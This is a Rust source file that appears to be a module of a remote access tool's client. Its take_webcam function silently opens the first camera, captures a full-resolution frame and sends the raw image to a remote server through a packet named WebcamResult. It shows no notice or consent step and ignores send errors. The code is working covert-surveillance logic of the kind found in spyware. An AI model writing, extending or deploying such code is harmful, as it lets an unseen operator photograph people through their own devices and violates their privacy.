use crate::handler::send_packet;
use common::packets::ServerboundPacket;
use tokio::task;

pub async fn take_webcam() {
    // Spawn blocking task since webcam operations are blocking
    task::spawn_blocking(move || {
        // Try to capture webcam image
        match capture_rgb_webcam_data() {
            Some(data) => {
                // Send the raw image data
                tokio::spawn(async move {
                    if let Err(_e) = send_packet(ServerboundPacket::WebcamResult(data)).await {
                    }
                });
            },
            None => {
                println!("Failed to capture webcam");
            }
        }
    });
}

// Captures raw webcam frame as RGB data
fn capture_rgb_webcam_data() -> Option<Vec<u8>> {
    use nokhwa::{Camera, utils::{CameraIndex, RequestedFormat, RequestedFormatType}};
    use nokhwa::pixel_format::RgbFormat;

    println!("Initializing webcam capture");
    
    // Try to get the first available webcam (index 0)
    let camera_index = CameraIndex::Index(0);
    
    // Explicitly request RGB format 
    let requested_format = RequestedFormat::new::<RgbFormat>(RequestedFormatType::AbsoluteHighestResolution);
    
    // Try to open the camera
    let mut camera = match Camera::new(camera_index, requested_format) {
        Ok(cam) => {
            cam
        },
        Err(_e) => {
            return None;
        }
    };
    
    // Try to start the camera stream
    if let Err(_e) = camera.open_stream() {
        return None;
    }
    
    // Try to capture a frame
    let frame = match camera.frame() {
        Ok(f) => {
            f
        },
        Err(_e) => {
            let _ = camera.stop_stream();
            return None;
        }
    };
    
    // Get the raw data from the frame (RGB format)
    let raw_data = frame.buffer().to_vec();
    
    // Close the camera stream
    let _ = camera.stop_stream();
    
    Some(raw_data)
}
